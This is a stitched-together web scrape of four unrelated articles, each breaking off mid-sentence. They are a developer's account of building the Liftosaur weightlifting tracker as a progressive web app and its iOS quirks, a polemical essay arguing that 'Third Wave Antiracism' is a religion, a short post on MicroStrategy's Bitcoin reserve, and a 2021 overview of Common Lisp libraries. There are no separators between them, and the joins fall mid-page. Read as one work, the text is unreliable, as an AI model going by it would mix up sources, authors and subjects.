<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://www.liftosaur.com/blog/images/quirks-of-building-a-pwa-app-pwa.png" alt="PWA Logo"></p>
<p>I wanted to build a weightlifting tracker app that would be like Stronglifts 5x5, but flexible, so you could build any program in there or modify any program for your needs. And it'd still be a user-friendly, pleasant to use app. And it'd have all the features you expect from that kind of app - progress view, graphs, rest timer, plates calculator, etc.</p>
<p>I write web apps for a living. I'm not a mobile developer. I knew that you could write web apps for mobile phones (they're called PWA - Progressive Web Apps), and then you can install them without App Store or Google Play, and theoretically, they'll be exactly like native apps.</p>
<p>There's also something cool, from idealistic point of view, in writing web apps and running them on phones (vs native apps). Web a is free and decentralized platform, I don't need to rely on Apple Store or Google Play rules, web apps exist kinda in parallel with the Apple/Google gate-keeped stores, and don't have to play by its rules. Also, the update cycles are way faster - I can just push the new version out, and it will be immediately delivered to users' devices, I don't need to wait for a week until my new app version is reviewed by Apple or Google. It's not like the main reason why I wrote PWA, though - the main reason is that I'm just very comfortable with building web apps, I know how to do it. I'm way less comfortable with building native apps.</p>
<p>But I also heard that you would never reach the same user experience as with native apps, though I wasn't sure why. What exactly would prevent that? I was curious to know, I thought - I'm going to write this app as a PWA specifically targeted for mobile devices and experience the development process, see what road bumps I could hit, and how far I could go before I hit a wall.</p>
<p>And here I am, nine months later, with a working PWA app, which is already pretty feature-rich, and I think at this point I can reflect on the development process and share my thoughts about PWAs and what it takes to develop them.</p>
<h2>What the heck is PWA?</h2>
<p><a href="https://www.liftosaur.com/about">Liftosaur</a> is a PWA. What that really means is that it has a <a href="https://www.liftosaur.com/manifest.webmanifest">manifest file</a> and <a href="https://www.liftosaur.com/webpushr-sw.js">a script</a>, that runs as a Service Worker - special JavaScript code, that is run by a browser separately from a web page, in a background. We add a link to our manifest file in <code>index.html</code> like this:</p>
<pre><code><span><span><span>&lt;</span>link</span> <span>rel</span><span><span>=</span><span>"</span>manifest<span>"</span></span> <span>href</span><span><span>=</span><span>"</span>/manifest.webmanifest<span>"</span></span> <span>/&gt;</span></span></code></pre>
<p>and then we load that service worker script like this:</p>
<pre><code>navigator<span>.</span>serviceWorker<span>.</span><span>register</span><span>(</span><span>"/webpushr-sw.js"</span><span>)</span><span>;</span></code></pre>
<p>and voila! Our web page just became a Progressive Web App!</p>
<p>The manifest file describes how your app will look like mostly on phones - what icons would be used, whether it's full screen or with a URL bar, title/description, what splash screen looks like, etc.</p>
<p>The service worker script currently mostly solves two problems:</p>
<ul>
<li>Caches all the scripts, styles, and some API calls so that the app would work offline.</li>
<li>Sets up Web Push mechanism, so you'd get pushes when the timer is triggered, and it's time to start another exercise set.</li>
</ul>
<p>And that's mostly it! After that, you can add that web page to your phone home screen, and it'll like a native web app.</p>

    <p><img src="https://www.liftosaur.com/blog/images/quirks-of-building-a-pwa-app-liftosaur.jpg" width="100%" alt="Liftosaur Screen on iOS"></p><p>This is what PWA app looks like on iOS</p>
  </div>
</div>
<p>But there are various problems associated with PWAs, related mainly to iOS Safari quirks and users' knowledge about PWAs.</p>
<h2>Pain points</h2>
<p>Mostly, my experience with building PWA - you can build decent PWA apps, though Mobile Safari definitely will try to make your life harder. I didn't really have any problems with Google Chrome on Android; the app works smoothly even on a cheap Android device. The major pain points were:</p>
<h3>Cookies are weird on iOS when you add your app to the home screen</h3>
<p>I initially set the app so that <code>index.html</code> and all other assets were loaded from <code>www.liftosaur.com</code> and served via Cloudflare CDN. API lived in Cloudflare workers on a separate domain, which used to be <code>liftosaur.workers.dev</code>. Some API expects the user to be logged in, so I had <code>liftosaur.workers.dev/api/signin/google</code>, which sets up a JWT auth cookie on the <code>liftosaur.workers.dev</code> domain. I don't need those cookies for the primary domain <code>www.liftosaur.com</code> (they're HttpOnly anyway, and I use them for API calls only). I thought it'd be fine - the cookies would live only on <code>liftosaur.workers.dev</code>, the browser would send them to all API endpoints (since they're also on <code>liftosaur.workers.dev</code>), and everything would just work. And it worked, almost everywhere - it worked in Mobile Safari browser, it worked in Chrome on Android. But if you add the app to the home screen on iOS, then for some reason, those cookies wouldn't be stored. Like, at all. I finally found a workaround - I stored the cookies with the <code>.liftosaur.com</code> domain and moved the API from <code>liftosaur.workers.dev</code> to <code>api.liftosaur.com</code>, so they'd share the same cookies with <code>www.liftosaur.com</code>. But it took me quite a while to figure that out.</p>
<h3>No web push notifications for iOS</h3>
<p>There's a feature in the app - after you've finished a set, you press a button, and it starts a timer. Once timer hits some threshold, it sends a push notification to your phone, so you know it's time to start another set. Apparently, there's no way to do that on iOS. I couldn't find a way to send a push notification in iOS, at all. It seems like a possible solution would be to install a "helper" native app that would proxy the push notification, but that seems excessive - I really doubt any user would want to do that!</p>
<h3>You can trigger a sound only on user action</h3>
<p>When the timer mentioned above hits a threshold, it plays a sound, so you know - it's time to start another set. I couldn't figure out how to do that on iOS. Safari on iOS only allows you to play a sound in e.g. an event click handler. If you try to play it on some random event happening (like for me, it was a Redux action triggering it), Safari complains about audio autoplay being forbidden. There're some solutions on the Internet/Stack Overflow, but none of them works. Apparently, if a user is done with the set and hits a button, you can start <code>setTimeout</code> and try to play the audio inside that <code>setTimeout</code>. It works, but only for small enough timeouts (like several seconds). Anything over a minute - and you get that audio autoplay forbidden error again.</p>
<p>I couldn't figure out that too for iOS. Liftosaur on iOS doesn't send push notifications when timers hit a threshold, and also it doesn't make a sound when it happens :(</p>
<h3>iOS could be pretty aggressive unloading from memory the opened PWA apps that are added to the home screen</h3>
<p>Imagine you just finished a set, and you switch to Twitter to read some stuff there while resting. A couple of minutes later, you switch back to Liftosaur - and iOS already unloaded it from memory, so Liftosaur loads again. So you need to make sure your app launches fast, and also you store as much internal state as possible in IndexedDB. Otherwise, users may have a horrible experience losing all their progress.</p>
<p>To be fair, it got better after iOS 13, and it's not as aggressive with unloading PWAs from memory anymore, but it still happens sometimes.</p>
<h3>Missing some default gestures</h3>
<p>There're some gestures built-in into any native app. Like swipe left to right across the screen gets you back to the previous page. Obviously you don't get them for PWAs, since it's just a web page.</p>
<p>It's not that big of a deal to implement those, but you have to implement those, and on a native app, you get them for free.</p>
<p>I personally don't use gestures much on my phone apps, but I can see how it could be a UX issue for some users.</p>
<h3>Choose your app icon wisely because it will stay forever</h3>
<p>If you add a PWA app to your home screen, whatever the app icon was, it will be there forever. Even if you update the manifest with the new icon, the icon won't change on the home screen. Not that big of a deal, but it definitely was an unpleasant surprise.</p>
<h3>Users have no idea what the heck PWA is</h3>
<p><strong>And here's our winner!!!</strong> The major pain point of PWA is the users' knowledge. They don't know that a web page they're on is a web app they can install to their home screen. They don't know how to do that (and frankly, iOS Safari doesn't even try to make it obvious). They often even never heard of PWAs at all. They don't know PWAs exist and they can add a web app to their home screen.</p>
<div>
  <div>
    <p><img src="https://www.liftosaur.com/blog/images/quirks-of-building-a-pwa-app-ios-share.png" width="100%" alt="Liftosaur Screen with share icon"></p><p>To add to home screen on iOS, you need to Share (!) first</p>
  </div>
  <div>
    <p><img src="https://www.liftosaur.com/blog/images/quirks-of-building-a-pwa-app-ios-add-to-home.png" width="100%" alt="Share screen with 'Add to Home Screen' option highlighted"></p><p>And there find the option "Add to Home Screen"</p>
  </div>
</div>
<p>So, you need to deliver the installation instructions to your users somehow. Since there's a good chance they've never installed a PWA previously in their life, there're high chances that this PWA will be their first one, and they are going to figure out how to do that.</p>
<p>It is already hard to convince somebody to install an app. Convince somebody to install a web app is ten times harder if they never did that, and they don't know it's possible.</p>
<p>To be fair, if you use a web app several times on Android Chrome, and it's a PWA, Chrome will suggest adding it to the home screen once it notices you use the app often. iOS Safari will not.</p>
<p>In my opinion, this is the worst pain point of PWA. Technology-wise, and especially on Android - you can make very decent phone apps, and get the user experience very close to native apps. But the people aspect - educating users about PWAs and how to install them - is way harder.</p>
<p>Here's a bright side, though - Google Play allows you to publish your PWAs right in the store. It's called <a href="https://developers.google.com/web/android/trusted-web-activity">TWA (Trusted Web Activity)</a>, and that makes the PWA installation process look exactly like a native app - you can find it in the Play Store, click Install, and it will get installed, just like a regular app. Obviously - nothing like that exists on iOS.</p>
<div>
  <p><img src="https://www.liftosaur.com/blog/images/quirks-of-building-a-pwa-app-google-play.png" width="100%" alt="Liftosaur in Google Play"></p><p>PWA in Google Play Store</p>
</div><p>To build TWA, you'll need to ensure you get maximum PWA points in Lighthouse, and then you can use <a href="https://www.pwabuilder.com/">PWABuilder</a>, that will generate Android APK, which you can upload to Google Play Store.</p>
<h2>Conclusion</h2>
<p>You definitely can …</p></div></div>

First Wave Antiracism battled slavery and segregation. Second Wave Antiracism, in the 1970s and 1980s, battled racist attitudes and taught America that being racist was a flaw. Third Wave Antiracism, becoming mainstream in the 2010s, teaches that racism is baked into the structure of society, so whites’ “complicity” in living within it constitutes racism itself, while for black people, grappling with the racism surrounding them is the totality of experience and must condition exquisite sensitivity toward them, including a suspension of standards of achievement and conduct.</p><p>Third Wave Antiracist tenets, stated clearly and placed in simple oppositions, translate into nothing whatsoever:</p><ol><li><p>When black people say you have insulted them, apologize with profound sincerity and guilt. <strong>But </strong>don’t put black people in a position where you expect them to forgive you. They have dealt with too much to be expected to.</p></li><li><p>Black people are a conglomeration of disparate individuals. “Black culture” is code for “pathological, primitive ghetto people.” <strong>But </strong>don’t expect black people to assimilate to “white” social norms because black people have a culture of their own.</p></li><li><p>Silence about racism is violence. <strong>But </strong>elevate the voices of the oppressed over your own.</p></li><li><p>You must strive eternally to understand the experiences of black people. <strong>But </strong>you can never understand what it is to be black, and if you think you do you’re a racist.</p></li><li><p>Show interest in multiculturalism.&nbsp;<strong>But </strong>do not culturally appropriate. What is not your culture is not for you, and you may not try it or do it. But—if you aren’t nevertheless <em>interested</em> in it, you are a racist.</p></li><li><p>Support black people in creating their own spaces and stay out of them. <strong>But </strong>seek to have black friends. If you don’t have any, you’re a racist. And if you claim any, they’d better be <em>good</em> friends—in their private spaces, you aren’t allowed in.</p></li><li><p>When whites move away from&nbsp;black neighborhoods, it’s white flight.&nbsp;<strong>But </strong>when whites move into black neighborhoods, it’s gentrification, even when they pay black residents generously for their houses.</p></li><li><p>If you’re white and only date white people, you’re a racist. <strong>But </strong>if you’re white and date a black person you are, if only deep down, exotifying an “other.”</p></li><li><p>Black people cannot be held accountable for everything every black person does. <strong>But </strong>all whites must acknowledge their personal complicity in the perfidy throughout history of “whiteness.”</p></li><li><p>Black students must be admitted to schools via adjusted grade and test score standards to ensure a representative number of them and foster a diversity of views in classrooms. <strong>But </strong>it is racist to assume a black student was admitted to a school via racial preferences, and racist to expect them to represent the “diverse” view in classroom discussions.</p></li></ol><p>I suspect that deep down, most know that none of this catechism makes any sense. Less obvious is that it was not even composed with logic in mind. The self-contradiction of these tenets is crucial, in revealing that Third Wave Antiracism is not a philosophy but a religion. </p><p>The revelation of racism is, itself and alone, the point, the intention, of this curriculum. As such, the fact that if you think a little, the tenets cancel one another out, is considered trivial. That they serve their true purpose of revealing people as bigots is paramount—sacrosanct, as it were. Third Wave Antiracism’s needlepoint homily <em>par excellence</em> is the following:</p><blockquote><p>Battling power relations and their discriminatory effects must be the central focus of all human endeavor, be it intellectual, moral, civic or artistic. Those who resist this focus, or even evidence insufficient adherence to it, must be sharply condemned, deprived of influence, and ostracized.</p></blockquote><p><strong>Third Wave Antiracism is losing innocent people jobs.</strong> It is coloring, detouring and sometimes strangling academic inquiry. It forces us to render a great deal of our public discussion of urgent issues in doubletalk any 10-year-old can see through. It forces us to start teaching our actual 10-year-olds, in order to hold them off from spoiling the show in that way, to believe in sophistry in the name of enlightenment. On that, Third Wave Antiracism guru Ibram X. Kendi has written a book on how to raise antiracist children called <em>Antiracist Baby</em>. You couldn’t imagine it better: Are we in a Christopher Guest movie? This and so much else is a sign that Third Wave Antiracism forces us to pretend that performance art is politics. It forces us to spend endless amounts of time listening to nonsense presented as wisdom, and pretend to like it.</p><p>I write this viscerally driven by the fact that all of this supposed wisdom is founded in an ideology under which white people calling themselves our saviors make black people look like the dumbest, weakest, most self-indulgent human beings in the history of our species, and teach black people to revel in that status and cherish it as making us special. Talking of <em>Antiracist Baby</em>, I am especially dismayed at the idea of this indoctrination infecting my daughters’ sense of self. I can’t always be with them, and this anti-humanist ideology may seep into their school curriculum. I shudder at the thought: teachers with eyes shining at the prospect of showing their antiracism by teaching my daughters that they are poster children rather than individuals. </p><p>Ta-Nehisi Coates in <em>Between the World and Me</em> wanted to teach his son that America is set against him; I want to teach my kids the reality of their lives in the 21st&nbsp;rather than early-to-mid-20th century. Lord forbid my daughters internalize a pathetic—yes, absolutely pathetic in all of the resonances of that word—sense that what makes them interesting is what other people think of them, or don’t.</p><p>Many will see me as traitorous in writing this as a black person. They will not understand that I see myself as serving my race by writing it. One of the grimmest tragedies of how this perversion of sociopolitics makes us think (or, not think) is that it will bar more than a few black readers from understanding that I am calling for them to be treated with true dignity. However, they and everyone else should also realize: I know quite well that white readers will be more likely to hear out views like this when written by a black person, and consider it nothing less than my duty as a black person to write it.</p><p>A white version of this would be blithely dismissed as racist. I will be dismissed instead as self-hating by a certain crowd. But frankly, they won’t really mean it, and anyone who gets through <a href="https://johnmcwhorter.substack.com/p/the-elect-neoracists-posing-as-antiracists">my new book</a> on this subject, which I am now publishing in serial, will see that whatever traits I harbor, hating myself or being ashamed of being black is not one of them. And we shall move on. As in, to realizing that what I am documenting matters, and matters deeply. Namely, that America’s sense of what it is to be intellectual, moral, or artistic; what it is to educate a child; what it is to foster justice; what is to express oneself properly; what it is to be a nation—all is being refounded upon a religion. </p><p>This is directly antithetical to the very foundations of the American experiment. Religion has no place in the classroom, in the halls of ivy, in our codes of ethics, or in deciding how we express ourselves, and almost all of us spontaneously understand that and see any misunderstanding of the premise as backward. Yet since about 2015, a peculiar contingent has been slowly headlocking us into making an exception, supposing that this new religion is so incontestably good, so gorgeously surpassing millennia of brilliant philosophers’ attempts to identify the ultimate morality, that we can only bow down in humble acquiescence.</p><p>But a new religion in the guise of world progress is not an advance; it is a detour. It is not altruism; it is self-help. It is not sunlight; it is fungus. It’s time it became ordinary to call it for what it is and stop cowering before it, letting it make people so much less than they—black and everything else—could be.</p><p><strong>Third Wave Antiracism exploits modern Americans’ fear</strong> of being thought racist, using this to promulgate an obsessive, self-involved, totalitarian and unnecessary kind of cultural reprogramming. One could be excused for thinking this glowering kabuki is a continuation of the Civil Rights efforts of yore, the only kind of new antiracism there could be. Its adherents preach with such contemptuous indignation, and are now situated in the most prestigious and influential institutions in the land—on their good days they can seem awfully “correct.”</p><p>However, there is nothing correct about the essence of American thought and culture being transplanted into the soil of a religious faith. Some will go as far as to own up to it being a religion, and wonder why we can’t just accept it as our new national creed. The problem is that on matters of societal procedure and priorities, the adherents of this religion—true to the very nature of religion—cannot be reasoned with. They are, in this, medievals with lattes.</p><p>We need not wonder what the basic objections will be: Third Wave Antiracism isn’t really a religion; I am oversimplifying; I shouldn’t write this without being a theologian; it is a religion but it’s a good one; and so on. I will get all of that out of the way as we go on, and then offer some genuine solutions. But first, what this is not.</p><ol><li><p><em>It is not an argument against protest.</em> I am not arguing against the basic premises of Black Lives Matter, although I have had my differences with some of its offshoot developments. I am not arguing that the Civil Rights movement of the 1950s and 1960s would have been better off sticking to quiet negotiations. I am not arguing against the left. I am arguing against a particular strain of the left that has come to exert a grievous influence over American institutions, to the point that we are beginning to …</p></li></ol></div></div>

            <p>A number of companies have recently started assembling Bitcoin treasuries. There are two <a href="https://bitcointreasuries.org/">good</a> <a href="https://bitcointreasuryreserve.com/">websites</a> for tracking these purchases. MicroStrategy currently has the largest known Bitcoin reserve (71,079 BTC) with 36% of the market cap attributed to the market value of their Bitcoin reserve.</p><p>They recently started to dabble in Bitcoin advocacy, hosting several <a href="https://www.microstrategy.com/en/search-results?q=bitcoin">sessions</a> and introducing ~6900 companies to their process for acquiring Bitcoin. If they succeed, expect the list to get a lot longer.</p><figure><img src="https://www.peteriserins.com/content/images/2021/02/image-2.png" alt="" srcset="https://www.peteriserins.com/content/images/size/w600/2021/02/image-2.png 600w, https://www.peteriserins.com/content/images/size/w1000/2021/02/image-2.png 1000w, https://www.peteriserins.com/content/images/2021/02/image-2.png 1048w" sizes="(min-width: 720px) 720px"><figcaption>bitcointreasuries.org</figcaption></figure><p>But why would someone pay $10 to own $3.6 in BTC?</p><p>For one, it's hard to access Bitcoin in tax efficient vehicles such as the UK's ISA accounts. Certain companies are also limited from taking on too much Bitcoin custody risk. And yes, some market participants could simply be speculating that MicroStrategy will be priced even higher due to its unique treasury strategy.</p><p>The idea is simple, $6.4 of each $10 purchase goes towards MicroStrategy's business. The business hopefully stays relatively stable and the rest of the purchase will be allocated to the BTC treasury.</p><p>But while MicroStrategy's business is in a stable <a href="https://seekingalpha.com/article/4395392-microstrategy-enterprise-software-to-bitcoin-speculation">decline</a>, the implied premium on their core business is much higher than I expected. In the chart above, the orange line indicates the implied price per each share that goes to the core business. From just over $100 earlier the year, it has now jumped to over $500, a 5x premium on the value of a falling business with no other ideas for investing excess cashflow. It may have been a good idea to invest in 2020. Not so much today.</p><p>So while it's an expensive way to buy BTC, Michael Saylor's <a href="https://www.sec.gov/Archives/edgar/data/0001050446/000119312521020760/d92691dex991.htm">comments</a> in their quarterly filings suggest another reason to buy.</p><blockquote>Going forward, we continue to plan to hold our bitcoin and invest additional excess cash flows in bitcoin. Additionally, we will explore various approaches to acquire additional bitcoin as part of our overall corporate strategy.</blockquote><p>The entire point of owning MicroStrategy is to outsource not just BTC ownership but BTC purchasing to Michael Saylor. It's the intent to buy even more BTC that has made MicroStrategy the leading Bitcoin treasury owner.</p><p>The premium may just pay for the promise that Michael Saylor together with Coinbase can identify better timing on when to make those purchases. Indeed, as an individual investor, it is trivial to purchase BTC at current prices, but substantial acquisitions by larger companies move the market and have to be carefully timed. For those companies, MicroStrategy can serve as a temporary holding point before they are able to build up their own position.</p><p><strong>Disclaimer</strong></p><p><em>This is not investment advice.</em></p>

<p>This is a description of the Common Lisp ecosystem, as of January, 2021,
from the perspective of a user and contributor.</p>

<p>The purpose of this article is both to give an overview of the
ecosystem, and to help drive consolidation in each domain.</p>

<p>Each application domain has recommendations for consolidating that
part of the ecosystem, and pointers for interesting future work.</p>

<p>This article is derived from
Fernando Borretti’s <a href="https://borretti.me/article/common-lisp-sotu-2015">State of the Common Lisp ecosystem from 2015</a>, hence the introduction that sounded familiar.
This new one will be an opportunity to look at what was achieved, or what is
still lacking.</p>

<p><strong>Disclaimer</strong>: This article is not a list of every project or article of interest that came out in the last years. I wrote an overview of 2018 closer to that goal <a href="https://lisp-journey.gitlab.io/blog/these-years-in-common-lisp-2018/">here</a>. More libraries can be discovered on the <a href="https://github.com/CodyReichert/awesome-cl">Awesome-cl</a> list, on GitHub and on <a href="https://www.cliki.net/">Cliki</a>.</p>

<p><strong>Acknowledgements</strong> I would like to thank @borodust, @ambrevar and @digikar for their kind feedback.</p>

<h2 id="command-line">Command line</h2>

<p>There used to be several options to ease building and distribution of command line programs,
but now <a href="https://github.com/snmsts/roswell">Roswell</a> has gained most momentum,
and that’s a good thing. Roswell is an implementation
manager, installer and a script runner, and one of its neat features is support for
very easily compiling tiny scripts into executables.</p>

<p>Now, <a href="https://guix.gnu.org/">GNU Guix</a> has gained many CL libraries, and becomes a contender to Roswell. Guix can be used as a package manager on top of your Unix distribution. It brings reproducible builds, rollbacks, the ability to install exact versions of any library (including system dependencies), contained environments and user profiles. It makes it easy too to install the latest version of a CL implementation and libraries and, to a certain extent, to share scripts. See the article <a href="https://ambrevar.xyz/lisp-repl-shell/index.html">A Lisp REPL as my main shell</a> for insights.</p>

<p>To parse command line arguments, <a href="https://github.com/mrkkrp/unix-opts">unix-opts</a> shows decent activity. As a reminder, the CLI arguments are stored portably in <code>uiop:command-line-arguments</code>.</p>

<p><a href="https://github.com/cl-adams/adams">Adams</a> is a new UNIX system administration tool, not unlike Chef or Ansible.</p>

<p><strong>Consolidation</strong></p>

<p>More features to the <a href="https://github.com/CodyReichert/awesome-cl#scripting">sripting libraries</a>.</p>

<p><strong>Future work</strong></p>

<p>The <a href="https://github.com/cxxxr/lem/">Lem editor</a> has built a great user interface and REPL on top of ncurses, with the cl-charms library. It would be great to re-use its components, so that Lispers could easily build similar rich terminal-based interfaces.</p>

<h2 id="databases">Databases</h2>

<p><a href="https://github.com/fukamachi/mito">Mito</a> is an ORM for Common Lisp
with migrations, relationships and PostgreSQL support. It is based on
cl-dbi (a uniform interface to the various database server-specific
libraries such as cl-postgres and cl-mysql) and SxQL (a DSL for
building safe, automatically parameterized SQL queries).</p>

<p>It also has a tutorial in the Cookbook:
<a href="https://lispcookbook.github.io/cl-cookbook/databases.html">Cookbook/databases</a>.</p>

<!-- On my blog, [an article](https://lisp-journey.gitlab.io/blog/composing-queries-with-mito-aka-replacing-lazy-querysets-and-q-objects/) -->

<!-- on how to compose queries with Mito and SxQL, and on how we only need -->

<!-- lisp knowledge to replace Django functionalities. -->

<p>There are of course more libraries in that field. Some new ones since 2015 are:</p>

<p><a href="https://github.com/ruricolist/cl-yesql">cl-yesql</a> (by the author of
Serapeum, Spinneret and other great libraries) is based on Clojure’s
Yesql.</p>

<p><a href="https://github.com/kraison/vivace-graph-v3">vivace-graph</a> is a <strong>graph
database</strong> and Prolog implementation, taking design and inspiration from
CouchDB, neo4j and AllegroGraph.</p>

<p>Vsevolod Dyomkin, the author of Rutils, the Programming Algorithms
book and other libraries, is writing
<a href="https://github.com/vseloved/cl-agraph">cl-agraph</a>, a minimal client
to Franz Inc’s <a href="https://allegrograph.com/">AllegroGraph</a>. AllegroGraph is a
“horizontally distributed, multi-model (document and graph),
entity-event <strong>knowledge graph</strong> technology”. It is proprietary and has a
free version with a limit of 5 million triples. Surely one of those Lisp hidden gems we should know more about.</p>

<p>A general migration tool was lacking. We now have
<a href="https://github.com/dnaeon/cl-migratum">cl-migratum</a>, a “system which
provides facilities for performing database schema migrations,
designed to work with various databases”.</p>

<p>And of course, <a href="https://github.com/dimitri/pgloader">pgloader</a> is still a Common Lisp success story.</p>

<p><strong>Achievement</strong></p>

<p>Among the emerging ORMs, Mito is the one actively maintained that Lispers seem to have chosen. Good. CLSQL certainly still works, but we don’t hear about it and it looks outdated. So, Mito it is.</p>

<p><strong>Consolidation</strong></p>

<p>Mito has 11 contributors and is actively watched, but it probably should have another(s) core maintainers.</p>

<p><strong>Future work</strong></p>

<p>Bindings for the new databases coming out.</p>

<h2 id="concurrency">Concurrency</h2>

<p>In the last year, Manfred Bergmann developed
<a href="https://github.com/mdbergmann/cl-gserver">cl-gserver</a>. It is a
“message passing” library/framework with <strong>actors</strong> similar to
<strong>Erlang</strong> or <strong>Akka</strong>. It is an important achievement.</p>

<p>Its v1 features:</p>

<ul>
<li>actors can use a shared pool of message dispatchers which effectively allows to create millions of actors.</li>
<li>the possibility to create actor hierarchies. An actor can have child actors. An actor now can also “watch” another actor to get notified about its termination.</li>
</ul>

<p>Many other libraries exist in this area:</p>

<ul>
<li><a href="https://common-lisp.net/project/bordeaux-threads/">BordeauxThreads</a> - Portable, shared-state concurrency

<ul>
<li>the “de-facto” concurrency library.</li>
</ul></li>
<li><a href="https://github.com/lmj/lparallel">lparallel</a> - A library for parallel programming.

<ul>
<li>also solid, battle-tested and popular, aka de-facto.</li>
</ul></li>
<li><a href="https://github.com/hawkir/calispel">calispel</a> - <a href="https://en.wikipedia.org/wiki/Communicating_sequential_processes">CSP</a>-like channels for common lisp. With blocking, optionally buffered channels and a “CSP select” statement. ISC-style.

<ul>
<li>“It is complete, flexible and easy to use. I would recommend Calispel over Lparallel and ChanL.” @Ambrevar. <a href="https://github.com/CodyReichert/awesome-cl/issues/290">discussion</a></li>
</ul></li>
<li><a href="https://github.com/zkat/chanl">ChanL</a> - Portable, channel-based concurrency.</li>
<li><a href="https://github.com/orthecreedence/cl-async">cl-async</a> - A library for general-purpose, non-blocking programming.

<ul>
<li>works atop libuv</li>
</ul></li>
<li><a href="https://github.com/TBRSS/moira">Moira</a> -  Monitor and restart background threads. In-lisp process supervisor.</li>
<li><a href="https://gitlab.com/ediethelm/trivial-monitored-thread">trivial-monitored-thread</a> -
a Common Lisp library offering a way of spawning threads and being
informed when one any of them crash and die.</li>
<li><a href="https://github.com/lmj/lfarm">lfarm</a> - distributing work across machines (on top of lparallel and usocket).</li>
<li><a href="https://github.com/taksatou/cl-gearman">cl-gearman</a> - a library for the <a href="http://gearman.org/">Gearman</a> distributed job system.

<ul>
<li>Alexander Artemenko used it instead of lfarm for Ultralisp:
<a href="https://40ants.com/lisp-project-of-the-day/2020/06/0095-cl-gearman.html">https://40ants.com/lisp-project-of-the-day/2020/06/0095-cl-gearman.html</a>,
because “lfarm is not well suited to environments where worker
hosts can go down and return back later”.</li>
</ul></li>
<li><a href="https://github.com/brown/swank-crew">swank-crew</a> - distributed computation framework implemented using Swank Client.</li>
<li><a href="https://github.com/takagi/cl-coroutine">cl-coroutine</a> - a coroutine library. It uses the CL-CONT continuations library in its implementation.</li>
<li><a href="https://github.com/cosmos72/stmx">CMTX</a>: high performance transactional memory for Common Lisp.

<ul>
<li>In our opinion, a library not well known and under-appreciated.</li>
</ul></li>
</ul>

<p>(see <a href="https://github.com/CodyReichert/awesome-cl#parallelism-and-concurrency">awesome-cl#parallelism-and-concurrency</a>)</p>

<p><strong>Consolidation</strong></p>

<p>Bordeaux-Threads is <em>the</em> “de-facto” library, but there is some choice
paralysis between Lparallel, Calispel, Bordeaux-Threads and SBCL’s
contribs. Use the libraries in the wild and write about them.</p>

<h2 id="file-formats">File formats</h2>

<p>There exist Common Lisp libraries for all the major file formats:</p>

<ul>
<li>XML: <a href="https://github.com/Shinmera/plump">Plump</a> (and <a href="https://github.com/Shinmera/lquery/">Lquery</a>), as well as <a href="https://common-lisp.net/project/cxml/">CXML</a>, which can parse large files incrementally.</li>
<li>JSON: <a href="https://github.com/Rudolph-Miller/jonathan">Jonathan</a>, <a href="https://common-lisp.net/project/cl-json/">cl-json</a> or <a href="https://sabracrolleton.github.io/json-review">more</a>. With utilities:

<ul>
<li><a href="https://github.com/y2q-actionman/cl-json-pointer">json-pointer</a> - A JSON Pointer implementation.</li>
<li><a href="https://github.com/gschjetne/json-mop">json-mop</a> - A metaclass for bridging CLOS and JSON objects (remind that JSON libraries can already serialize your own objects).</li>
<li><a href="https://github.com/fisxoj/json-schema">json-schema</a></li>
</ul></li>
<li>YAML: cl-yaml</li>
<li>CSV: <a href="https://github.com/AccelerationNet/cl-csv">cl-csv</a></li>
</ul>

<p><strong>Achievement</strong></p>

<p>New in 2015, Jonathan is now a good first choice for an easy to use and fast JSON encoder and decoder.</p>

<p><strong>Consolidation</strong></p>

<p>There is not a predominant JSON library. This leads to choice paralysis.</p>

<p>They all represent null values differently. We need a library that
“does the right thing”. See maybe the massive <a href="https://github.com/xh4/web-toolkit#json">web-toolkit</a> for its JSON handling ?</p>

<blockquote>
<p>It distinguishes null, false and [] from Lisp’s NIL thus supports identical transformation between JSON values. It provides object constructor and accessor to build and access nesting JSON objects.</p>
</blockquote>

<p>Give the <a href="https://github.com/sharplispers/xpath">XPath</a> library some love and documentation.</p>

<p><strong>Future Work</strong></p>

<p>Still valid from 2015:</p>

<blockquote>
<p>A YAML parser so that cl-yaml doesn’t depend on the libyaml library would make distribution far simpler.</p>
</blockquote>

<h2 id="gui">GUI</h2>

<p>A usual complain in Common Lisp land is the lack of a complete,
cross-platform GUI solution. Ltk is a very good library, but Tk is
limited. Qtools is great, but is only for Qt4.</p>

<p>A lot has happened, and is still happening (if you watch the right
repositories, you know that a Qt5 wrapper is in the works (ECL already has Qt5 bindings: <a href="https://gitlab.com/eql/EQL5/">EQL5</a>, with an <a href="https://gitlab.com/eql/EQL5-Android">Android port</a>)).</p>

<p>edit: see also <a href="https://gitlab.com/eql/eql5-sailfish">EQL5-sailfish</a> for Sailfish OS. <a href="https://openrepos.net/user/13436/programs">Here</a> are two example apps.</p>

<p>Matthew Kennedy wrote excellent FFI bindings to the IUP Portable User
Interface library: <a href="https://github.com/lispnik/iup/">IUP</a>. IUP is
cross-platform (Windows, macOS, GNU/Linux, with new Android, iOS,
Cocoa and Web Assembly drivers), has many widgets (but less than Qt), has a small API and
is actively developed. IUP was created at the PUC university of Rio de Janeiro.</p>

<p>Nicolas Hafner started <a href="https://github.com/Shirakumo/alloy">Alloy</a>, a
new user interface protocol and toolkit implementation, which he uses in his Kandria game.</p>

<p>Very recently, David Botton released <a href="https://github.com/rabbibotton/clog">CLOG</a>, “the Common Lisp Omnificent GUI”:</p>

<blockquote>
<p>CLOG uses web technology to produce graphical user interfaces for applications locally or remotely. CLOG can take the place, or work alongside, most cross-platform GUI frameworks and website frameworks. The CLOG package starts up the connectivity to the browser or other websocket client (often a browser embedded in a native template application.)</p>

<p>It is complete enough for most uses.</p>
</blockquote>

<p>There are more GUI libraries and frameworks: <a href="https://github.com/CodyReichert/awesome-cl#Gui">https://github.com/CodyReichert/awesome-cl#Gui</a> (and more under the works). In particular, LispWorks’ CAPI is still presented as the best in town by the ones who tried it.</p>

<p><strong>Consolidation</strong></p>

<p>Since roughly October, 2020, Nicolas Hafner works full time on
<a href="https://kandria.com/">Kandria</a>. Supporting his work, through <a href="https://github.com/sponsors/Shinmera">GitHub
sponsors</a> or
<a href="https://ko-fi.com/shinmera">ko-fi</a> would be 1) a great sign of recognition and 2) useful for the ecosystem, especially for Alloy.</p>

<p>I wrote an introduction to these frameworks in the Cookbook:
<a href="https://lispcookbook.github.io/cl-cookbook/gui.html">Cookbook/gui</a>. More
examples or demo projects would be welcome.</p>

<p>There are two actively maintained diverged forks of the GTK bindings. A …</p></div></div>

